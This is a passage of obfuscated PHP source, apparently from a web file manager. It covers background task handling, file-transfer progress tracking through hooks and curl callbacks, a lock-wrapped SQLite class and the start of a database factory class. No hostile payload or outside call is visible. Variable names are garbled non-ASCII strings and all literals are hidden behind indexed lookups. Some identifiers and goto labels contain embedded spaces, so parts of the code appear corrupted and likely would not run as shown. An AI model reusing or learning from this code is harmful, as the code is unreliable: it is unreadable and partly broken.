killAll() { $FÃ¢ˆ½’£§ =& $_SERVER[£¶ä½¶¢]; $e³°Ï½±ñ‘ = self::listData(); foreach ($e³°Ï½±ñ‘ as $c°÷Ê¥…‘İ) { self::kill($c°÷Ê¥…‘İ[$FÃ¢ˆ½’£§[401]]); } sleep(2); foreach ($e³°Ï½±ñ‘ as $c°÷Ê¥…‘İ) { self::valueSet($c°÷Ê¥…‘İ[$FÃ¢ˆ½’£§[401]], !1); } } private static function changeStatus($cêáêàÊÏ, $E«Ë†˜ÚÔ) { goto c™—‡Æˆíè; f•ŒÉÍÖ¯¢: $Bö°óåˆèè[$C¬Şé¬¬„Û[718]] = $E«Ë†˜ÚÔ; self::valueSet($cêáêàÊÏ, $Bö°óåˆèè); self::log($C¬Şé¬¬„Û[1545] . $Bö°óåˆèè[$C¬Şé¬¬„Û[401]] . $C¬Şé¬¬„Û[1546] . $E«Ë†˜ÚÔ); goto DÈª¿ ×Æ; DÈª¿ ×Æ: return !0; goto A¡½ÌŠ†¥; c™—‡Æˆíè: $C¬Şé¬¬„Û =& $_SERVER[£¶ä½¶¢]; $Bö°óåˆèè = self::valueGet($cêáêàÊÏ); if (!$Bö°óåˆèè) { return !1; } goto f•ŒÉÍÖ¯¢; A¡½ÌŠ†¥: } public static function valueGet($dé‹¦³îÚù = false) { $A„ßÆ»“Ö =& $_SERVER[£¶ä½¶¢]; if ($dé‹¦³îÚù) { $BÆ£…ó¬ñ = Model($A„ßÆ»“Ö[433])->where(array($A„ßÆ»“Ö[103] => $dé‹¦³îÚù, $A„ßÆ»“Ö[39] => $A„ßÆ»“Ö[1547]))->find(); return $BÆ£…ó¬ñ ? json_decode($BÆ£…ó¬ñ[$A„ßÆ»“Ö[381]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($BÁ³¨Áàõ± = false) { goto dËå˜ï¶ù; aïƒùíäÇì: return $däÍÕÃŞÓô; goto eŠ‰îÇ›œ„; AñŒáÔ—ñ‚: $däÍÕÃŞÓô = Model($b»Ãôçç›¢[433])->where($d¼†ñÚ¹£¿)->select(); $däÍÕÃŞÓô = $däÍÕÃŞÓô ? $däÍÕÃŞÓô : array(); foreach ($däÍÕÃŞÓô as $FØ¼øÅŒø§ => $fÄœ†è¨à) { $däÍÕÃŞÓô[$FØ¼øÅŒø§] = json_decode($fÄœ†è¨à[$b»Ãôçç›¢[381]], !0); } goto aïƒùíäÇì; dËå˜ï¶ù: $b»Ãôçç›¢ =& $_SERVER[£¶ä½¶¢]; $d¼†ñÚ¹£¿ = array($b»Ãôçç›¢[39] => $b»Ãôçç›¢[1547]); if ($BÁ³¨Áàõ±) { $d¼†ñÚ¹£¿[$b»Ãôçç›¢[1526]] = $BÁ³¨Áàõ±; } goto AñŒáÔ—ñ‚; eŠ‰îÇ›œ„: } public static function valueSet($bÚ¤Ëãó, $DË†Ø÷î¶¢) { goto c¸¦ŒÈ—‡Ì; fµ¾ÛÚ—ğÀ: if (!$E²’†ğîˆ²) { ob_start(); var_dump($DË†Ø÷î¶¢); $B´ò“ŸŒö = ob_get_clean(); self::log($A›÷Ğ½†›½[1548] . json_encode_force($B´ò“ŸŒö)); } if (!$bÚ¤Ëãó || !$DË†Ø÷î¶¢[$A›÷Ğ½†›½[401]]) { return !1; } $c¨„õÇõ–‰ = array($A›÷Ğ½†›½[39] => $A›÷Ğ½†›½[1547], $A›÷Ğ½†›½[1526] => USER_ID, $A›÷Ğ½†›½[103] => $bÚ¤Ëãó, $A›÷Ğ½†›½[381] => $E²’†ğîˆ²); goto DÆ–òë¸ô½; c¸¦ŒÈ—‡Ì: $A›÷Ğ½†›½ =& $_SERVER[£¶ä½¶¢]; if (!$DË†Ø÷î¶¢) { return Model($A›÷Ğ½†›½[433])->where(array($A›÷Ğ½†›½[103] => $bÚ¤Ëãó, $A›÷Ğ½†›½[39] => $A›÷Ğ½†›½[1547]))->delete(); } $E²’†ğîˆ² = json_encode($DË†Ø÷î¶¢); goto fµ¾ÛÚ—ğÀ; DÆ–òë¸ô½: Model($A›÷Ğ½†›½[433])->add($c¨„õÇõ–‰, array(), !0); goto d«¢„Ì„ˆ; d«¢„Ì„ˆ: } public static function log($dè…É±¤ŸÁ) { if (!GLOBAL_DEBUG) { return; } write_log($dè…É±¤ŸÁ, $_SERVER[£¶ä½¶¢][1549]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto F óÛÛÍ; fçÅùÛ·ä¿: Hook::bind($C¢‡›ÛêŸ[1562], array($this, $C¢‡›ÛêŸ[1563])); Hook::bind($C¢‡›ÛêŸ[1564], array($this, $C¢‡›ÛêŸ[1565])); Hook::bind($C¢‡›ÛêŸ[1566], array($this, $C¢‡›ÛêŸ[1567])); goto cÀİ’ˆñ; cÀİ’ˆñ: $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1568]] = LNG($C¢‡›ÛêŸ[1569]); $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1570]] = 0; $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1571]] = 0; goto Aå„µ¼‘‡º; då–œÛñ‚«: Hook::bind($C¢‡›ÛêŸ[574], array($this, $C¢‡›ÛêŸ[1555])); Hook::bind($C¢‡›ÛêŸ[575], array($this, $C¢‡›ÛêŸ[1556])); Hook::bind($C¢‡›ÛêŸ[577], array($this, $C¢‡›ÛêŸ[1557])); goto a”ß‚ÇÙÇª; CÚë¶ßæ¹ˆ: Hook::bind($C¢‡›ÛêŸ[547], array($this, $C¢‡›ÛêŸ[1558])); Hook::bind($C¢‡›ÛêŸ[549], array($this, $C¢‡›ÛêŸ[1558])); Hook::bind($C¢‡›ÛêŸ[551], array($this, $C¢‡›ÛêŸ[1558])); goto cœßƒ‘šê¦; cœßƒ‘šê¦: Hook::bind($C¢‡›ÛêŸ[1559], array($this, $C¢‡›ÛêŸ[1560])); Hook::bind($C¢‡›ÛêŸ[567], array($this, $C¢‡›ÛêŸ[1561])); $this->sourceModelCopyFlag = !1; goto fçÅùÛ·ä¿; Aå„µ¼‘‡º: $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1021]] = $C¢‡›ÛêŸ[43]; $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1572]] = $C¢‡›ÛêŸ[43]; $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1573]] = 0; goto FÕïÇÚçÚÂ; a”ß‚ÇÙÇª: Hook::bind($C¢‡›ÛêŸ[578], array($this, $C¢‡›ÛêŸ[1557])); Hook::bind($C¢‡›ÛêŸ[545], array($this, $C¢‡›ÛêŸ[1558])); Hook::bind($C¢‡›ÛêŸ[542], array($this, $C¢‡›ÛêŸ[1558])); goto CÚë¶ßæ¹ˆ; FÕïÇÚçÚÂ: $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1574]] = 0; $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1575]] = 0; if (!$bÃÄñæÕÊ[$C¢‡›ÛêŸ[1432]]) { $bÃÄñæÕÊ[$C¢‡›ÛêŸ[1432]] = LNG($C¢‡›ÛêŸ[1576]); } goto B¯‚Ìçè; bòÃÏØ‚£: Hook::bind($C¢‡›ÛêŸ[1550], array($this, $C¢‡›ÛêŸ[1551])); Hook::bind($C¢‡›ÛêŸ[1108], array($this, $C¢‡›ÛêŸ[1552])); Hook::bind($C¢‡›ÛêŸ[1553], array($this, $C¢‡›ÛêŸ[1554])); goto då–œÛñ‚«; F óÛÛÍ: $C¢‡›ÛêŸ =& $_SERVER[£¶ä½¶¢]; $bÃÄñæÕÊ =& $this->task; $this->sourceCopyFolder = !1; goto bòÃÏØ‚£; B¯‚Ìçè: } protected function endAfter() { goto b…ŸëÌ”™‡; aÕ¼Ÿã¸‰¬: Hook::unbind($B¥¾§å´Š[551], array($this, $B¥¾§å´Š[1558])); Hook::unbind($B¥¾§å´Š[1559], array($this, $B¥¾§å´Š[1560])); Hook::unbind($B¥¾§å´Š[567], array($this, $B¥¾§å´Š[1561])); goto F„§ÑÈ¾Ê; BƒÔ¾Ú‚Ÿæ: Hook::unbind($B¥¾§å´Š[542], array($this, $B¥¾§å´Š[1558])); Hook::unbind($B¥¾§å´Š[547], array($this, $B¥¾§å´Š[1558])); Hook::unbind($B¥¾§å´Š[549], array($this, $B¥¾§å´Š[1558])); goto aÕ¼Ÿã¸‰¬; Eİçàˆöê¸: Hook::unbind($B¥¾§å´Š[1553], array($this, $B¥¾§å´Š[1554])); Hook::unbind($B¥¾§å´Š[574], array($this, $B¥¾§å´Š[1555])); Hook::unbind($B¥¾§å´Š[575], array($this, $B¥¾§å´Š[1556])); goto E÷÷†©å´Û; b…ŸëÌ”™‡: $B¥¾§å´Š =& $_SERVER[£¶ä½¶¢]; Hook::unbind($B¥¾§å´Š[1550], array($this, $B¥¾§å´Š[1551])); Hook::unbind($B¥¾§å´Š[1108], array($this, $B¥¾§å´Š[1552])); goto Eİçàˆöê¸; F„§ÑÈ¾Ê: Hook::unbind($B¥¾§å´Š[1562], array($this, $B¥¾§å´Š[1563])); Hook::unbind($B¥¾§å´Š[1564], array($this, $B¥¾§å´Š[1565])); Hook::unbind($B¥¾§å´Š[1566], array($this, $B¥¾§å´Š[1567])); goto eíºÏÅµŠ¢; E÷÷†©å´Û: Hook::unbind($B¥¾§å´Š[577], array($this, $B¥¾§å´Š[1557])); Hook::unbind($B¥¾§å´Š[578], array($this, $B¥¾§å´Š[1557])); Hook::unbind($B¥¾§å´Š[545], array($this, $B¥¾§å´Š[1558])); goto BƒÔ¾Ú‚Ÿæ; eíºÏÅµŠ¢: } public function copyMoveStart($e»›ÊğÌŒÊ, $FŠĞ†ö«Ÿ, $BİòÇ¬óÁ, $d’áÁÒ±ğ¿) { goto eÅª–óÊø; eÅª–óÊø: $BƒâË°÷–¾ =& $_SERVER[£¶ä½¶¢]; self::log($BƒâË°÷–¾[1577] . $FŠĞ†ö«Ÿ . $BƒâË°÷–¾[77] . $d’áÁÒ±ğ¿); $AÕ‚Ö„Ó¤ = rtrim(TEMP_FILES, $BƒâË°÷–¾[18]); goto A„µ¬ëÓÁ”; A„µ¬ëÓÁ”: if (substr($FŠĞ†ö«Ÿ, 0, strlen($AÕ‚Ö„Ó¤)) == $AÕ‚Ö„Ó¤) { return; } if (substr($d’áÁÒ±ğ¿, 0, strlen($AÕ‚Ö„Ó¤)) == $AÕ‚Ö„Ó¤) { return; } $f¼‡†È¯«§ =& $this->task; goto EÌòîô”Õ; EÌòîô”Õ: $f¼‡†È¯«§[$BƒâË°÷–¾[1578]] = KodIO::transferType($e»›ÊğÌŒÊ, $BİòÇ¬óÁ); $this->update(); goto aºµÏ–ŒŒÓ; aºµÏ–ŒŒÓ: } public function updateAfter() { goto dïæİ‹¬œ; Dàùµ†à¦œ: if ($this->sourceModelCopyFlag) { return; } if ($d®§ ÆŸ [$dÅ”ê„½ö’[1578]] == $dÅ”ê„½ö’[1180]) { return; } if ($d®§ ÆŸ [$dÅ”ê„½ö’[1578]] == $dÅ”ê„½ö’[1092] || $d®§ ÆŸ [$dÅ”ê„½ö’[1578]] == $dÅ”ê„½ö’[117]) { if ($d®§ ÆŸ [$dÅ”ê„½ö’[1572]]) { $d®§ ÆŸ [$dÅ”ê„½ö’[1575]] = $d®§ ÆŸ [$dÅ”ê„½ö’[1574]] + $d®§ ÆŸ [$dÅ”ê„½ö’[1571]]; } } else { if ($d®§ ÆŸ [$dÅ”ê„½ö’[1578]] == $dÅ”ê„½ö’[1181]) { if ($d®§ ÆŸ [$dÅ”ê„½ö’[1572]] == $dÅ”ê„½ö’[1092]) { $d®§ ÆŸ [$dÅ”ê„½ö’[1575]] = $d®§ ÆŸ [$dÅ”ê„½ö’[1574]] + $d®§ ÆŸ [$dÅ”ê„½ö’[1571]] * 0.5; } else { if ($d®§ ÆŸ [$dÅ”ê„½ö’[1572]] == $dÅ”ê„½ö’[117]) { $d®§ ÆŸ [$dÅ”ê„½ö’[1575]] = $d®§ ÆŸ [$dÅ”ê„½ö’[1574]] + $d®§ ÆŸ [$dÅ”ê„½ö’[1570]] * 0.5 + $d®§ ÆŸ [$dÅ”ê„½ö’[1571]] * 0.5; } } } } goto eæÁâŒäÒ§; eæÁâŒäÒ§: $d®§ ÆŸ [$dÅ”ê„½ö’[1527]] = $d®§ ÆŸ [$dÅ”ê„½ö’[1575]] / $d®§ ÆŸ [$dÅ”ê„½ö’[731]]; if ($d®§ ÆŸ [$dÅ”ê„½ö’[1527]] > 0) { $EŞ™ñƒ± ù = timeFloat() - $d®§ ÆŸ [$dÅ”ê„½ö’[757]] - $d®§ ÆŸ [$dÅ”ê„½ö’[1530]]; $d®§ ÆŸ [$dÅ”ê„½ö’[1531]] = $EŞ™ñƒ± ù * (1 - $d®§ ÆŸ [$dÅ”ê„½ö’[1527]]) / $d®§ ÆŸ [$dÅ”ê„½ö’[1527]]; } goto dÂÕá¼—Ä; dïæİ‹¬œ: $dÅ”ê„½ö’ =& $_SERVER[£¶ä½¶¢]; $d®§ ÆŸ  =& $this->task; if (!$d®§ ÆŸ [$dÅ”ê„½ö’[731]]) { return; } goto Dàùµ†à¦œ; dÂÕá¼—Ä: } public function addPath($E’ä¢Ä×ÅÅ) { goto fì›ÉòÔí“; e„ï÷Ñ†ˆ: if ($cİà®ï”¯[$DŒ¤“¹ÆÍ¹[39]] == $DŒ¤“¹ÆÍ¹[203]) { $FÊ˜›¯Œë—[$DŒ¤“¹ÆÍ¹[1019]] += 1; } else { $FÊ˜›¯Œë—[$DŒ¤“¹ÆÍ¹[1019]] += $cİà®ï”¯[$DŒ¤“¹ÆÍ¹[91]][$DŒ¤“¹ÆÍ¹[89]]; if ($cİà®ï”¯[$DŒ¤“¹ÆÍ¹[403]]) { $FÊ˜›¯Œë—[$DŒ¤“¹ÆÍ¹[1019]] += $cİà®ï”¯[$DŒ¤“¹ÆÍ¹[91]][$DŒ¤“¹ÆÍ¹[90]] + 1; } } $FÊ˜›¯Œë—[$DŒ¤“¹ÆÍ¹[731]] += $cİà®ï”¯[$DŒ¤“¹ÆÍ¹[88]]; $this->update(); goto Fš§ïîç«á; EåˆÏ†’¤Ñ: $cİà®ï”¯ = IO::infoWithChildren($E’ä¢Ä×ÅÅ); $a³òˆ‘ìÛ = $FÊ˜›¯Œë—[$DŒ¤“¹ÆÍ¹[1579]] ? $FÊ˜›¯Œë—[$DŒ¤“¹ÆÍ¹[1579]][$DŒ¤“¹ÆÍ¹[1580]] : 0; $FÊ˜›¯Œë—[$DŒ¤“¹ÆÍ¹[1579]] = array($DŒ¤“¹ÆÍ¹[1580] => $a³òˆ‘ìÛ + 1, $DŒ¤“¹ÆÍ¹[421] => $cİà®ï”¯[$DŒ¤“¹ÆÍ¹[38]], $DŒ¤“¹ÆÍ¹[86] => $cİà®ï”¯[$DŒ¤“¹ÆÍ¹[86]], $DŒ¤“¹ÆÍ¹[503] => $cİà®ï”¯[$DŒ¤“¹ÆÍ¹[503]] ? $cİà®ï”¯[$DŒ¤“¹ÆÍ¹[503]] : $cİà®ï”¯[$DŒ¤“¹ÆÍ¹[86]]); goto e„ï÷Ñ†ˆ; fì›ÉòÔí“: $DŒ¤“¹ÆÍ¹ =& $_SERVER[£¶ä½¶¢]; if (!$E’ä¢Ä×ÅÅ) { return; } $FÊ˜›¯Œë— =& $this->task; goto EåˆÏ†’¤Ñ; Fš§ïîç«á: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($E‡¡’·¤©Ó) { $eÏç½”Èãè =& $_SERVER[£¶ä½¶¢]; $B¾Ô§é½î¢ =& $this->task; $B¾Ô§é½î¢[$eÏç½”Èãè[1568]] = $E‡¡’·¤©Ó[$eÏç½”Èãè[38]]; $B¾Ô§é½î¢[$eÏç½”Èãè[1021]] = $E‡¡’·¤©Ó[$eÏç½”Èãè[38]]; $this->update(); } public function copyFileStart($b¦åÅÉïğ¥, $DÌƒÕßƒ§, $dØõç‡‡º, $FååøÊ’ƒ, $C«ßŒÇÓ¨Ì, $d®ëŸ×˜¹É) { goto eáÅøŒ¾‚÷; BœœÒ½§« : $GLOBALS[$cß„Œ›ëš—[1582]] = $C«ßŒÇÓ¨Ì; $GLOBALS[$cß„Œ›ëš—[1581]] = $d®ëŸ×˜¹É; $dâ¤õ¢õõ¥ =& $this->task; goto EÒ‰Õ±‚Öº; cŸ®ÌèÆæÓ: $dâ¤õ¢õõ¥[$cß„Œ›ëš—[1021]] = $cß„Œ›ëš—[43]; $dâ¤õ¢õõ¥[$cß„Œ›ëš—[1572]] = $cß„Œ›ëš—[43]; $dâ¤õ¢õõ¥[$cß„Œ›ëš—[1573]] = 0; goto e´ô‚·Å‚; eáÅøŒ¾‚÷: $cß„Œ›ëš— =& $_SERVER[£¶ä½¶¢]; $B¬„î‡î´ = $C«ßŒÇÓ¨Ì; if ($B¬„î‡î´ == $GLOBALS[$cß„Œ›ëš—[1581]]) { $B¬„î‡î´ = $GLOBALS[$cß„Œ›ëš—[1582]]; } goto BœœÒ½§« ; e´ô‚·Å‚: $this->update(); goto b–§§ïº£; EÒ‰Õ±‚Öº: $dâ¤õ¢õõ¥[$cß„Œ›ëš—[1568]] = $B¬„î‡î´; $dâ¤õ¢õõ¥[$cß„Œ›ëš—[1570]] = (int) $b¦åÅÉïğ¥->size($DÌƒÕßƒ§); $dâ¤õ¢õõ¥[$cß„Œ›ëš—[1571]] = 0; goto cŸ®ÌèÆæÓ; b–§§ïº£: } public function copyFileEnd($Bªğê¤®ª, $FØê²æ¼÷ç, $eŒÍ¹¼ùÆ, $cÇçÇ£ƒß¦, $dšËÓ‘…“, $fçšà¤÷ù) { $b‘±õ«Ş—œ =& $_SERVER[£¶ä½¶¢]; $fëœ¿ÇÍñ =& $this->task; $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1571]] = $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1570]]; $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1572]] = $b‘±õ«Ş—œ[43]; if ($dšËÓ‘…“ == $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1568]]) { $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1574]] += $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1570]]; $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1575]] = $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1574]]; $this->update(1); } else { $this->update(); $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1571]] = 0; } self::log($b‘±õ«Ş—œ[1583] . $FØê²æ¼÷ç . $b‘±õ«Ş—œ[77] . $cÇçÇ£ƒß¦ . $b‘±õ«Ş—œ[9] . $dšËÓ‘…“ . $b‘±õ«Ş—œ[1584] . $fëœ¿ÇÍñ[$b‘±õ«Ş—œ[1568]]); } public function updateFileEnd($aÅĞ­éì†, $a¥–è„é‘³) { goto AµÕ¯öœ‚; AµÕ¯öœ‚: $B‹±Ş…—‘ =& $_SERVER[£¶ä½¶¢]; $fÀèäö¯¢ =& $this->task; $fÀèäö¯¢[$B‹±Ş…—‘[1568]] = $aÅĞ­éì†; goto Cä·Î¨Ö†â; b³¾É‚×‰™: $this->update(1); self::log($B‹±Ş…—‘[1585] . $aÅĞ­éì†); goto dßîé¹Û; Cä·Î¨Ö†â: $fÀèäö¯¢[$B‹±Ş…—‘[1570]] = $a¥–è„é‘³; $fÀèäö¯¢[$B‹±Ş…—‘[1574]] += $a¥–è„é‘³; $fÀèäö¯¢[$B‹±Ş…—‘[1575]] = $fÀèäö¯¢[$B‹±Ş…—‘[1574]]; goto b³¾É‚×‰™; dßîé¹Û: } public function sourceModelCopy($B—ÙŞ•»×) { goto A‘Ï‘ê¹; D¶¾¤íŠô: switch ($dùÜ¤ÊÌòÂ) { case $eğğ„»ù[543]: $f¾¨ˆªÄ±© = 1; break; case $eğğ„»ù[546]: $bÙñº¨Á[$eğğ„»ù[1568]] = $fƒ¯Š®º¬[$eğğ„»ù[38]]; break; case $eğğ„»ù[548]: $f¾¨ˆªÄ±© = intval($B—ÙŞ•»×[$eğğ„»ù[385]] * 0.4); break; case $eğğ„»ù[550]: $f¾¨ˆªÄ±© = intval($B—ÙŞ•»×[$eğğ„»ù[385]] * 0.2); break; case $eğğ„»ù[552]: $f¾¨ˆªÄ±© = intval($B—ÙŞ•»×[$eğğ„»ù[385]] * 0.4); break; } $this->update($f¾¨ˆªÄ±©); $this->sourceModelCopyFlag = !1; goto A÷ôÂÒƒ”; A‘Ï‘ê¹: $eğğ„»ù =& $_SERVER[£¶ä½¶¢]; $dùÜ¤ÊÌòÂ = $B—ÙŞ•»×[0]; $fƒ¯Š®º¬ = $B—ÙŞ•»×[1]; goto Bè•‰—õä‘; Bè•‰—õä‘: $bÙñº¨Á =& $this->task; $this->sourceModelCopyFlag = !0; $f¾¨ˆªÄ±© = 0; goto D¶¾¤íŠô; A÷ôÂÒƒ”: } public function sourceRemove($d½îùœ¤÷è, $C®äòÜâ¸Œ) { $Cà³ÒğÙ‘ =& $_SERVER[£¶ä½¶¢]; $this->sourceModelCopyFlag = !0; $DØï÷À„øÙ = 1; if (isset($d½îùœ¤÷è[$Cà³ÒğÙ‘[91]])) { $DØï÷À„øÙ = $d½îùœ¤÷è[$Cà³ÒğÙ‘[91]][$Cà³ÒğÙ‘[89]] + $d½îùœ¤÷è[$Cà³ÒğÙ‘[91]][$Cà³ÒğÙ‘[90]] + 1; } $this->update($DØï÷À„øÙ); $this->sourceModelCopyFlag = !1; } public function sourceMove($cÕŸŠ•éó) { $this->sourceRemove($cÕŸŠ•éó, !1); } public function curlProgress($böì®Öö×², $a—¤ğº®Í, $a·íÎÎëöµ, $Bá×ø©İëâ, $B¥©È«’ñŒ) { $e÷’Ë¼‡Ïˆ =& $_SERVER[£¶ä½¶¢]; $FÕ÷Ôºñ =& $this->task; if ($B¥©È«’ñŒ > 0) { $FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1021]] = $e÷’Ë¼‡Ïˆ[1586]; $FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1572]] = $e÷’Ë¼‡Ïˆ[117]; if ($FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1570]]) { $FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1571]] = $B¥©È«’ñŒ; } if ($FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1573]]) { $FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1571]] = $B¥©È«’ñŒ + $FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1573]]; } } else { if ($a·íÎÎëöµ > 0) { if ($FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1570]] == $a—¤ğº®Í) { $FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1571]] = $a·íÎÎëöµ; $FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1021]] = $e÷’Ë¼‡Ïˆ[1587]; $FÕ÷Ôºñ[$e÷’Ë¼‡Ïˆ[1572]] = $e÷’Ë¼‡Ïˆ[1092]; } } } $this->update(); } public function curlProgressStart($bË‰¼Ë²î) { } public function curlProgressEnd($b‚ØŒÎòÒ) { goto bºá×–½–ß; bºá×–½–ß: $aÆÇ°³óåù =& $_SERVER[£¶ä½¶¢]; $b…—óïÙõ =& $this->task; $EçÂ–öõ”Ô = curl_getinfo($b‚ØŒÎòÒ); goto EÄ à‹²¤à; EÄ à‹²¤à: $dÎâ‘ø”…² = $EçÂ–öõ”Ô[$aÆÇ°³óåù[1588]]; if ($dÎâ‘ø”…² == -1) { $dÎâ‘ø”…² = $EçÂ–öõ”Ô[$aÆÇ°³óåù[1589]]; } if ($b…—óïÙõ[$aÆÇ°³óåù[1572]] == $aÆÇ°³óåù[117] && $dÎâ‘ø”…²) { $b…—óïÙõ[$aÆÇ°³óåù[1573]] += $dÎâ‘ø”…²; } goto BöÏºÇã¬ ; BöÏºÇã¬ : $this->update(); goto B¾Ñ¬ªîª; B¾Ñ¬ªîª: } } goto aÁÃ§ßİë¶; d…’å±ˆèÑ: class DbSqlite3 extends DbSqlite3Base { public function query($cØàä„„ªö) { $c¡ÙÔòˆ½ç =& $_SERVER[£¶ä½¶¢]; if (!CacheLock::fileLock($c¡ÙÔòˆ½ç[19])) { return !1; } $A¬Âò‘ÊØî = parent::query($cØàä„„ªö); CacheLock::fileUnLock($c¡ÙÔòˆ½ç[19]); return $A¬Âò‘ÊØî; } public function execute($cêÊõğ®Ê§) { $a“¶ĞŒä =& $_SERVER[£¶ä½¶¢]; if (!CacheLock::fileLock($a“¶ĞŒä[19])) { return !1; } $aÀèö®Æ¬ï = parent::execute($cêÊõğ®Ê§); CacheLock::fileUnLock($a“¶ĞŒä[19]); return $aÀèö®Æ¬ï; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\145\161" => "\x3c\76", "\147\164" => "\x3e", "\145\x67\x74" => "\x3e\75", "\x6c\x74" => "\74", "\x65\x6c\164" => "\74\75", "\x6e\157\x74\154\151\153\145" => "\x4e\117\x54\40\114\111\113\x45", "\154\151\153\x65" => "\114\111\113\x45", "\x69\x6e" => "\x49\x4e", "\x6e\157\x74\x69\x6e" => "\x4e\117\124\x20\x49\x4e", "\156\x6f\x74\40\x69\x6e" => "\116\117\x54\40\x49\x4e", "\x62\145\164\167\145\145\x6e" => "\102\x45\124\x57\x45\x45\116", "\156\157\164\142\x65\x74\x77\145\145\156" => "\116\117\124\40\x42\x45\124\x57\105\x45\x4e", "\156\157\164\x20\x62\x65\164\167\x65\145\156" => "\x4e\117\124\40\x42\105\124\x57\105\x45\116"); protected $selectSql = "\123\x45\x4c\105\103\124\x25\104\111\x53\124\x49\116\x43\124\x25\40\x25\106\111\x45\114\x44\45\40\x46\122\117\115\x20\x25\124\x41\x42\x4c\105\45\x25\112\117\111\x4e\45\x25\127\110\105\122\x45\x25\x25\x47\122\117\125\x50\45\45\x48\x41\x56\111\116\107\45\x25\x4f\x52\104\105\122\45\45\114\x49\x4d\111\124\x25\x20\45\x55\116\111\117\x4e\x25\x25\x43\117\115\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $A ÷šõœ›£ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[£¶ä½¶¢][917], $A ÷šõœ›£); } public function factory($dæØÔ›‰ = '') { goto B…‹£Ò’Òé; D‘×çÍƒß: return $F¾“… ÜÔç; goto ašÄ›ÈÌèÙ; B…‹£Ò’Òé: $b§áÍê´ÎË =& $_SERVER[£¶ä½¶¢]; $dæØÔ›‰ = $this->parseConfig($dæØÔ›‰); if (empty($dæØÔ›‰[$b§áÍê´ÎË[918]])) { think_exception(think_lang($b§áÍê´ÎË[919])); } goto E­Ø‡î; E­Ø‡î: $this->dbType = ucwords(strtolower($dæØÔ›‰[$b§áÍê´ÎË[918]])); $bæØ±¼”Ô„ = $b§áÍê´ÎË[920] . $this->dbType; if (class_exists($bæØ±¼”Ô„)) { $F¾“… ÜÔç = new $bæØ±¼”Ô„($dæØÔ›‰); if ($b§áÍê´ÎË[763] != strtolower($dæØÔ›‰[$b§áÍê´ÎË[918]])) { $F¾“… ÜÔç->dbType = strtoupper($this->dbType); } else { $F¾“… ÜÔç->dbType = $this->_getDsnType($dæØÔ›‰[$b§áÍê´ÎË[873]]); } } else { think_exception(think_lang($b§áÍê´ÎË[921]) . $b§áÍê´ÎË[922] . $bæØ±¼”Ô„); } goto D‘×çÍƒß; ašÄ›ÈÌèÙ: } public function __call($D±âÏªä”, $A¯ËŠñß®) { if (method_exists($this, $D±âÏªä”)) { return call_user_func_array(array($this, $D±âÏªä”), $A¯ËŠñß®); } } protected function _getDsnType($B¥–—Ó©¿) { $B¯ÆñÅÁÒ = explode($_SERVER[£¶ä½¶¢][14], $B¥–—Ó©¿); $f¡íÀ°ä†† = strtoupper(trim($B¯ÆñÅÁÒ[0])); return $f¡íÀ°ä††; } private function parseConfig($A¹‡ˆ«¬­Ä = '') { $eôÎ½ÛÎÛ =& $_SERVER[£¶ä½¶¢]; if (!empty($A¹‡ˆ«¬­Ä) && is_string($A¹‡ˆ«¬­Ä)) { $A¹‡ˆ«¬­Ä = $this->parseDSN($A¹‡ˆ«¬­Ä); } elseif (is_array($A¹‡ˆ«¬­Ä)) { $A¹‡ˆ«¬­Ä = array_change_key_case($A¹‡ˆ«¬­Ä); $A¹‡ˆ«¬­Ä = array($eôÎ½ÛÎÛ[918] => $A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[762]], $eôÎ½ÛÎÛ[846] => $A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[923]], $eôÎ½ÛÎÛ[847] => $A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[924]], $eôÎ½ÛÎÛ[844] => $A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[925]], $eôÎ½ÛÎÛ[845] => $A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[926]], $eôÎ½ÛÎÛ[27] => $A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[927]], $eôÎ½ÛÎÛ[873] => $A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[764]], $eôÎ½ÛÎÛ[23] => isset($A¹‡ˆ«¬­Ä[$eôÎ½ÛÎÛ[928]]) ? 